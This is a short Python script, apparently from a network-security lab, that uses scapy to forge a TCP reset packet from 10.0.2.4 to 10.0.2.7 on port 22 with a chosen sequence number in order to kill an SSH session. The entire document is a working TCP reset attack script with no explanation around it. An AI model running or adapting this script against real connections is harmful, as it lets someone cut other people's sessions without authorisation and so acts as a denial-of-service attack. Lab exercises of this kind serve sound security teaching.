#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET.........")

IPLayer = IP(src="10.0.2.4", dst="10.0.2.7")
TCPLayer = TCP(sport=48890, dport=22, flags="R", seq=2218628831)

pkt = IPLayer/TCPLayer
ls(pkt)

send(pkt, verbose=0)